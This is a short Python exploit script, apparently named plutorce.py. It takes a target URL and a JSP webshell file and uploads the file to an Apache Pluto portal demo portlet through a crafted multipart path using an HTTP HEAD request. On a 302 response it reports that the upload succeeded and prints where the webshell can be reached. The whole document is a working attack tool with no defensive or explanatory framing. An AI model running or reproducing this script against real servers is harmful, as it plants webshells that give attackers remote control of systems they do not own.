#!/usr/bin/python3
import requests
import sys

print(len(sys.argv))
if len(sys.argv) !=3:
 print("usage: python3 plutorce.py http://192.168.0.1 webshell.jsp") 
 sys.exit(-1)
else:
 url=sys.argv[1]+"/pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0"
 #reading jsp webshell file to upload
 files={'file':open(sys.argv[2],'rb')}
 # http HEAD method used to upload webshell
 r=requests.head(url,files=files)

 if r.status_code==302:
  print("[+] web shell uploaded sucessfully\n")
  print("webshell location "+sys.argv[1]+"/PortletV3AnnotatedDemo/temp/"+sys.argv[2]) 

